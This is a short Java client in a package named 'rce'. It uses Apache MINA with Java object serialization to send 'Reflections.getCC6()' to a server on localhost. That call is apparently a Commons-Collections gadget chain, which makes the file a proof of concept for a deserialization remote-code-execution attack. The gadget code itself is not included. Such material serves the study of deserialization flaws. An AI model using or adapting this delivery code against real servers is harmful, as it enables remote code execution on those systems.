package org.apache.mina.example.rce;

import org.apache.mina.core.future.ConnectFuture;
import org.apache.mina.core.service.IoConnector;
import org.apache.mina.core.service.IoHandlerAdapter;
import org.apache.mina.core.session.IoSession;
import org.apache.mina.filter.codec.ProtocolCodecFilter;
import org.apache.mina.filter.codec.serialization.ObjectSerializationCodecFactory;
import org.apache.mina.transport.socket.nio.NioSocketConnector;
//import payload.Generator;
import java.net.InetSocketAddress;
 
public class MinaClient {
    private static final String HOSTNAME = "localhost";
    private static final int PORT = 9123;
    
    public static void main(String[] args) throws Exception {
        IoConnector connector = new NioSocketConnector();
        connector.getFilterChain().addLast("codec", new ProtocolCodecFilter(new ObjectSerializationCodecFactory()));
        connector.setHandler(new ClientHandler());
        ConnectFuture future = connector.connect(new InetSocketAddress(HOSTNAME, PORT));
        future.awaitUninterruptibly();
        IoSession session = future.getSession();
        session.write(Reflections.getCC6());
        session.getCloseFuture().awaitUninterruptibly();
        connector.dispose();
    }
    
    private static class ClientHandler extends IoHandlerAdapter {
        @Override
        public void messageReceived(IoSession session, Object message) {
            System.out.println("Received from server: " + message);
        }
    }
}